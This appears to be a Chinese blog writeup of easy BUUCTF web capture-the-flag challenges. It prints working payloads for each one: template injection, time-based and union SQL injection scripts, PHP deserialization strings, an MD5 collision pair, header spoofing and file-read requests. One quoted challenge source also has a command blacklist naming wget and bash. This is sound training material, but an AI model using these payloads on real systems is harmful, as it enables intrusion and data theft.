---
title: BUUCTF Web Writeup Part1 <简单部分>
categories:
  - 平台Writeup
tags:
  - ctf
  - Web
  - Writeup
index_img: /img/used/prac.jpg
date: 2020-01-14 19:25:33
---

# BUUCTF Web Part1

简单部分按照BUUCTF的分数进行划分，1分题目认为是简单题目。一共有32题

## [护网杯 2018]easy_tornado（模板

进去给了三个页面，并提示flag`flag in /fllllllllllllag`。

显然要找到任意文件读取处，又在hint中看到`md5(cookie_secret+md5(filename))`。url有一个filehash，应该就是这个算法。

还有一个错误页面，url有msg=ERROR，修改了一下发现页面也改变，猜测有Render，尝试模板注入。

输入

```
{{handler.settings}}
```

可以查看tornado的一些参数，包括cookie_secret。

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '5e8306b3-7ae1-45b4-9116-d0fe4c02eacd'} 
```

然后读取文件就可以了。

```
db6fc544-8be8-4438-9c50-638366f85ec33bf9f6cf685a6dd8defadabfb41a03a1
做个md5
```

`flag{44fc3be2-b981-4e3e-addb-65fd6fca1759}`

## [CISCN2019 华北赛区 Day2 Web1]Hack World

给了个sql让你注入。过滤了以下内容：

```
空格 and # 等等
```

直接用sleep盲注，套路这样子：如果猜对了就造成一秒延迟

```sql
sleep((select(flag)from(flag)where(flag)like('f%'))like('f%'))
```

于是可以编写Python脚本了（老套路。

```python
import requests

def timeblind(url):
    flag = 'flag{'
    while True:
        find = False
        for i in '0123456789abcdefghijklmnopqrstuvwxyz{}_': #字母表
            #盲注语句
            data = {'id':"sleep((select(flag)from(flag)where(flag)like('f%'))like('{i}%'))".format(i=flag+i)}
            print(data)
            try:
                requests.post(url=url,data=data,timeout=1)
            except:
                flag=flag+i
                print('[*]%s'%flag)
                find = True
                break
        if i=='}':
            break
        #防止找错
        if not find:
            flag = flag[0:-1]
    print('[+]%s'%flag)

url = 'http://d53059c8-8795-4474-bdea-e66790292e91.node3.buuoj.cn/index.php'
timeblind(url)
```

`flag{5957e413_b9a1_439f_8a23_28a749be15dc}`

## [De1CTF 2019]SSRF Me

Hint: flag is in ./flag.txt

SSRF，以服务器做跳板访问敏感文件。首先题目给出了源码

```python
#初始化语句

app = Flask(__name__)
secert_key = os.urandom(16)

class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False

#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()

def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"
      
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

def md5(content):
    return hashlib.md5(content).hexdigest()

def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False

if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0')
```

审计可知，我们可以通过scan函数获取任意文件（即flag.txt)，但是要满足：

```python
getSign(self.action, self.param) == self.sign

其中：
action = urllib.unquote(request.cookies.get("action"))
param = urllib.unquote(request.args.get("param", ""))
sign = urllib.unquote(request.cookies.get("sign"))

action可以是scan和read，只有read in self.action才能读取数据

而函数getSign有一个我们不知道的secret_key
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
  
还有一个获得sign的方法，但这个action是scan
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)
  
```

注意到代码这里判断有漏洞。 read in self.action的判断，不能保证self.action就是read，只要包含read即可。于是把这些限制条件放在一起，构造：

```
  xxx + param + action （getSign）
  xxx + param + scan  （geneSign）
  相等
  
  xxx + flag.txt + readscan == xxx + flag.txtread + scan  就满足了。
```

于是在geneSign中，param=flag.txtread，获得md5 `0c1e730e3608cfbe60ca3d25eeb72e34`

再在挑战中把相应的action和sign写好，就可以获得flag了。

`flag{01fdf84a-9c71-433e-8740-3f8b1920905e}`

## [网鼎杯 2018]Fakebook（反序列化和注入

首先robots.txt发现了网站一个备份文件user.php.bak

```php
<?php

class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

随便注册一个，注册页面发现post注入，评论页面发现no参数注入，sqlmap试一下，在post处dump到数据。

![](https://ww1.yunjiexi.club/2020/01/22/jKtiP.md.png)

发现是php反序列化的数据。

```php
O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:16:"www.arklight.xyz";}
```

注意到另一个注入点no处，我们输入一个不存在的id，会提示

![](https://ww1.yunjiexi.club/2020/01/22/jK9Rw.png)

说明age和blog是接受了php反序列化的对象的，并且报错语句暴露了物理路径。

所以照着这个思路，经过尝试，构造注入语句

```
no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' --+
```

成功包含。

```php
?php

$flag = "flag{c1e552fdf77049fabf65168f22f7aeab}";
exit(0);
>
```

`flag{c1e552fdf77049fabf65168f22f7aeab}`

## [安洵杯 2019]easy_web（简单bypass

这道题告诉我们，遇到可疑的参数一定要多试探试探

上来只给了一个页面，有一个cmd和img参数。测试了cat,ls等一些命令，有的回显forbid，有的回显md5 is funny。

img很像base64，两次b64解密一次hex解密得到`555.png`，于是尝试文件包含漏洞。

用index.php加密后包含，把返回的字串再解密，获得php内容

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>

```

是一个md5碰撞，随便找一个(注意post的时候要在参数里面写，不能直接粘贴)

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

cmd用base64命令就可以绕过了。

![](https://ww1.yunjiexi.club/2020/01/15/jBv7w.png)

`flag{decd145e-ca34-4623-b75a-a9c07b4f3b94}`

## [极客大挑战 2019]BuyFlag(简单bypass

pay.php页面发现了注释隐藏代码

```php
~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

首先把cookie的user=0改成1试试

然后利用弱类型比较，password传入404s就可以了

接下来还让你pay for flag。没有什么线索，post一个money=100000000试试，结果输入这个数字就过长，小于这个数就不够。十六进制也不好使，说明不是用大于号判断的。

可能是判断了位数，或者strcmp了一下。传入一个数组money[]=0试试，成功拿到flag

`flag{eb549aa7-5a6f-4c07-9d2e-6d50299c15bc}`

## [极客大挑战 2019]Http(简单前端trick

这道题告诉我们，可以在源代码里面搜索`.php`的文件，说不定就在注释中发现了呢

首先扫了一通，没发现什么有用的东西。。。看了下提示，发现在源代码中找到了一个Secret.php，可以跳转！

于是进去，要求改referer.

```
referer: https://www.Sycsecret.com
```

改完之后，有要求用规定浏览器。

```
User-Agent: Syclover
```

接下来提示No!!! you can only read this locally!!!

```
X-Forwarded-For: 127.0.0.1
```

就可以了。

`flag{a188def4-715f-4370-b999-e1b5b3e3b009}`

## [SUCTF 2019]Pythonginx

给出源码

```python

        
        @app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
    
```

考察[CVE-2019-9636: urlsplit does not handle NFKC normalization](https://bugs.python.org/issue36216)。

## [RoarCTF 2019]Easy Java(Java Web的理解

本题需要比较熟悉javaweb的运作原理。Javaweb的目录结构如下：

```
WEB-INF/web.xml泄露
WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件
```

help页面尝试任意文件下载，还必须要改成POST才可以。。获得javaweb的/WEB-INF/web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
...
    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

从这里我们看到flag字样，尝试访问servletmapping，有错误。继续尝试任意文件下载

```
POST /Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class
```

这样构造是根据servlet-class得知包结构。获得class文件，其中一段base64尝试解密，就获得flag

`flag{467175f3-85f7-4e8c-b35b-a6d3762f2783}`

## [极客大挑战 2019]Secret File(简单前端抓包

一些前端trick。抓包发现隐藏的请求，得到一个文件secr3t.php

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

简单的phpfilter一下获得base64就好了。

`flag{3f1ed6c1-cc9b-4fd1-917c-02f664f24085}`

## [0CTF 2016]piapiapia(代码审计、利用漏洞构造反序列化

开始只有一个登录框，开sqlmap跑没什么用。。

扫描目录发现源码泄露，为www.zip。

用这道题练习一下代码审计的思路。

### 先试试找flag

直接全局搜索flag，发现存在于`config.php`中

```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```

全局审计代码，发现有文件包含处

```php
#profile.php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);//最后发现这里
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);//然后找到这句
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));//首先发现这个
?>
```

发现`$profile`变量是从`$user->show_profile($username);`获取的，继续跟进

```php
public function show_profile($username) {
		$username = parent::filter($username);

		$where = "username = '$username'";
		$object = parent::select($this->table, $where);//这里
		return $object->profile;
	}
```

继续

```php
public function select($table, $where, $ret = '*') {
		$sql = "SELECT $ret FROM $table WHERE $where";
		$result = mysql_query($sql, $this->link);
		return mysql_fetch_object($result);
	}
```

发现这里读取数据库中的信息进行反序列化，尝试在写入的时候，利用序列化的漏洞，构造序列化字串。在update.php中发现下列过程

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)#注意，这里进行了过滤！
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
```

这个对于nickname的过滤可以使用数组进行绕过。因为preg_match(数组)会返回false。自己搭建环境测试一下

```php
<?php
error_reporting(E_ALL);
class profile{
	var $phone = "11111111111";
	var $email = "1@qq.com";
	var $nickname;
	var $photo = "config.php";

	function setNickname($name){
		$this->nickname = $name;
	}

};
$a = new profile;
$b[] = '';
$a -> setNickname($b);
echo(serialize($a));
```

我们想构造

`O:7:"profile":4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:8:"1@qq.com";s:8:"nickname";a:1:{i:0;s:0:"";}s:5:"photo";s:10:"config.php";} `

令nickname的值为`"";}s:5:"photo";s:10:"config.php";} `得到

`O:7:"profile":4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:8:"1@qq.com";s:8:"nickname";a:1:{i:0;s:34:"";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:10:"config.php";}`

nickname后面的数字应该为0，但是为33，这使得构造的序列化不能成功。

继续跟进存放序列化字串的过程。在update.php中调用了这个函数存放

```php
$user->update_profile($username, serialize($profile));
```

跟进

```php
public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
```

发现进行了过滤，查看过滤

```php
public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
```

发现了华点！filter的机制是把字符串替换成hacker，如果是序列化字串中的where替换成了hacker，会使得预期的读取字串变少。也就是说我们只要用34个连续的where，经过替换后变成了hacker，那么nickname的读取字符结束，它只读了34个hacker。接下来就可以如期读取我们构造的payload了。

因此nickname应该这样构造

```php
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

至此，大功告成。抓包修改即可。

![](https://ww1.yunjiexi.club/2020/02/04/1rfmX.png)

![](https://ww1.yunjiexi.club/2020/02/04/1rCtz.md.png)

![](https://ww1.yunjiexi.club/2020/02/04/1reHV.png)

flag{1a865c97-b085-4929-8374-62ecdd7c3d34}`

## asd(PHP反序列化漏洞

提示了备份网站的习惯，扫到了www.php，和flag有关的文件如下：

index.php

```php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

class.php

```php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
?>
```

目的是跳过wakeup，利用反序列化的漏洞即可。注意这里private成员反序列化后，类名前和变量名前都有ASCII零，因此选择用python发送。

```python
>>> url = "http://735a68fd-aaf6-437c-b7c8-c2aabe4e979b.node3.buuoj.cn"
>>> payload = 'O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}'
>>> res = requests.get(url+"?select="+payload)
>>> print(res.text)
```

`flag{c335e323-6b3b-444d-876f-7a1d92624304}`

## [ASIS 2019]Unicorn shop(Python Unicode漏洞

这道题的靶场复现没有做好。大概意思是：输入的数据只能是一位，却要我们购买第四个价值千元的物品。我们随便尝试一些数据后发现报错信息

```python
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/site-packages/tornado/web.py", line 1541, in _execute
    result = method(*self.path_args, **self.path_kwargs)
  File "/app/sshop/views/Shop.py", line 34, in post
    unicodedata.numeric(price)
TypeError: need a single Unicode character as parameter
```

看到这里调用了将Unicode转换为Numeric的方法。

[这个网站](https://www.compart.com/en/unicode/)提供了很多关于Unicode的数据。联想到以前阅读的Python文档，Unicode是有一个字面值的，我们希望找到单个Unicode字符的字面值大于1337，然后提交

![](https://ww1.yunjiexi.club/2020/02/07/1QrtL.png)

查看网页，发现关键信息

```html
<meta charset="utf-8"><!--Ah,really important,seriously. -->
```

于是我们找到编码方式，抓包修改数据即可。

![](https://ww1.yunjiexi.club/2020/02/07/1Qqpb.png)

```
id=4&price=%E1%8D%BC
```

`flag{75f7a091-5393-432e-bd81-feec67c02eb0}`

## [SWPU2019]Web1(无列名注入

发现xss+SQL，xss试了下没成功，SQL过滤了一些，但还是尝试出来了。首先确定列数，经过一些尝试。。

![](https://ww1.yunjiexi.club/2020/02/07/1yQuB.md.png)

后面用单引号闭合，因为报错信息显示了limit 0,1前面还有一个引号。

回显的地方是2和3，我们在2和3得到这样信息

```
version: 10.2.26-MariaDB-log
user: root@localhost
database: web1
```

看看文档查表名：

```
-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

发现一个FLAG_TABLE。因为information_schema被过滤，查不到列名，这里使用无列名注入的技术。

无列名注入实际上就是这样的结构:

```
select 1,2,3 union select * from Another_Table
```

注意前面的数字一定要和后面的表列数相同。这是一个子查询，如果对这个子查询进行查询，那么子查询的列名就已知了，我们就可以这样构造

```
select `2` from (select 1,2,3 union select * from Another_Table)x
```

于是可以依照此思路尝试。

```
-1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b,2,3/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

> 1,1,2,3

-1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b,3/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

>2,flag,admin,test

-1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

>3,flag{e2f69eb9-91ca-43ee-bb74-bd81bd3e2860},53e217ad4c721eb9565cf25a5ec3b66e,202cb962ac59075b964b07152d234b70
```

`flag{e2f69eb9-91ca-43ee-bb74-bd81bd3e2860}`

## [WesternCTF2018]shrine

给出源代码，看来是SSTI，把括号都替换掉了，又过滤了两个关键词`config`和`self`

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)

```

其实源代码有问题，应该是这样的

```
@app.route('/shrine/<path:shrine>')
```

注意这个过滤

```python
''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) 
```

这个意思是，如果直接输入黑名单中的单词，会被模板引擎替换成None，而不是说把字符改变为None。因此这两个单词还是可以出现的，只不过不能单独出现。

想要引用config，需要获得当前app的对象。

flask中有一些内置函数，通过这些函数的globals()方法，可以获取很多属性。其中内置函数比较好用的就包括`url_for`和`get_flashed_messages`

这样注入

```
{{url_for.__globals__}}
```

获得了很多信息，其中current_app就是我们需要的。

```python
{'find_package': <function find_package at 0x7f49be53b140>, '_find_package_path': <function _find_package_path at 0x7f49be53b0c8>, 'get_load_dotenv': <function get_load_dotenv at 0x7f49be65da28>, '_PackageBoundObject': <class 'flask.helpers._PackageBoundObject'>, 'current_app': <Flask 'app'>,....
```

继续

```
{{url_for.__globals__['current_app'].config}}
```

就可以了。当然，另一个函数也是可以的

```
{{get_flashed_messages.__globals__['current_app'].config}}
```

`flag{323244f8-f7d2-43d4-9a4d-e6e420b4d30d}`

## [CISCN2019 华北赛区 Day1 Web1]Dropbox

